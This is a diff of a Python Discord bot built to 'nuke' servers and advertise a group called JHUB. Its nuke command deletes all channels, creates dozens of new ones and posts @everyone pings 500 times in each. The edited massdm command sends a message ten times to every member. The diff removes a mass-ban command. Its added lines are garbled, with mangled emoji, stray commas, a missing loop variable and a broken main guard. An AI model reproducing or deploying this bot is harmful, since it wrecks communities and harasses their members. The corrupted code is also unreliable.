@@ -3,11 +3,11 @@ from discord.ext import commands
 import os
 import asyncio
 
-# Configuration
+Configuration,
 prefix = "!"
 channel_name = "nuked-by-jhub"
 spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
-channels_to_create = 25
+channels_to_create = 30
 pings_per_channel = 500
 
 intents = discord.Intents.all()
@@ -15,7 +15,7 @@ bot = commands.Bot(command_prefix=prefix, intents=intents)
 
 @bot.event
 async def on_ready():
-    print(f"✅ {bot.user} is online and ready.")
+    print(f"âœ… {bot.user} is online and ready.")
 
 async def spam_channel(channel):
     for i in range(pings_per_channel):
@@ -32,7 +32,7 @@ async def spam_channel(channel):
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    print("⚠️ Starting NUKE sequence...")
+    print("âš ï¸ Starting NUKE sequence...")
 
     # Delete all channels
     channels = list(guild.channels)
@@ -47,7 +47,7 @@ async def nuke(ctx):
             except Exception as e:
                 print(f"Failed to delete channel {channel.name}: {e}")
 
-    await asyncio.gather(*(safe_delete(c) for c in channels))
+    await asyncio.gather((safe_delete(c) for c in channels))
     await asyncio.sleep(2)
 
     # Create channels
@@ -65,53 +65,37 @@ async def nuke(ctx):
     # Spam all channels concurrently
     print("Starting to spam all channels...")
     spam_tasks = [asyncio.create_task(spam_channel(ch)) for ch in created_channels]
-    await asyncio.gather(*spam_tasks)
+    await asyncio.gather(spam_tasks)
 
-    print("✅ NUKE complete.")
-
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def restore(ctx):
-    """Ban everyone in the server except the bot owner and yourself."""
-    await ctx.send("Starting to ban all members...")
-
-    for member in ctx.guild.members:
-        try:
-            if member != ctx.author and member != bot.user:
-                await member.ban(reason="Mass ban initiated")
-                print(f"Banned {member}")
-                await asyncio.sleep(0.1)  # prevents hitting rate limits
-        except Exception as e:
-            print(f"Could not ban {member}: {e}")
-
-    await ctx.send("Finished banning all members.")
-
+    print("âœ… NUKE complete.")
 
 @bot.command()
-async def massdm(ctx):
+async def massdm(ctx, , message: str):
     await ctx.message.delete()
     guild = ctx.guild
-    print("⚠️ Starting MASS DM sequence...")
+    print("âš ï¸ Starting MASS DM sequence...")
 
     members = list(guild.members)
     print(f"Found {len(members)} members in the server.")
     sem = asyncio.Semaphore(5)
 
-    async def send_dm(member):
+    async def senddm(member):
         async with sem:
-            try:
-                await member.send("Join JHUB for the best scripts https://discord.gg/tBM8wuuN5p   https://discord.gg/tBM8wuuN5p   https://discord.gg/tBM8wuuN5p")
-                print(f"Sent DM to {member.name}")
-            except Exception as e:
-                print(f"Failed to send DM to {member.name}: {e}")
+            for  in range(10):  # Send the message 10 times
+                try:
+                    await member.send(message)
+                    print(f"Sent DM to {member.name}")
+                    await asyncio.sleep(1)  # Small delay to avoid rate limiting
+                except Exception as e:
+                    print(f"Failed to send DM to {member.name}: {e}")
 
-    await asyncio.gather(*(send_dm(m) for m in members))
+    await asyncio.gather((send_dm(m) for m in members))
 
-    print("✅ MASS DM complete.")
+    print("âœ… MASS DM complete.")
 
-if __name__ == "__main__":
+if name == "main":
     token = os.getenv("DISCORD_TOKEN")
     if not token:
-        print("❌ Error: DISCORD_TOKEN environment variable not found.")
+        print("âŒ Error: DISCORD_TOKEN environment variable not found.")
         exit(1)
     bot.run(token)
